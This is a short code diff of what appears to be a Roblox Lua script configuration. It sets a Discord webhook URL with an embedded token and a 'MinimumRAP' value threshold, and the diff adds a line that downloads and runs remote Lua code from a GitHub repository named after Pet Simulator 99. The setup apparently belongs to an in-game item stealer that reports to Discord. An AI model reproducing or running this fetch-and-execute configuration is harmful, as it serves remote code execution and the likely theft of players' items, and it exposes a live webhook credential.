@@ -3,4 +3,4 @@ Webhook= 'https://discordapp.com/api/webhooks/1363262162277240852/grmmEXV0Ig5wuQ
 
 MinimumRAP = 500000
 
-loadstring(game:HttpGet('YOUR GITHUB RAW LINK'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/pettsimullator99/Pettsimullator99/refs/heads/main/script.lua'))()
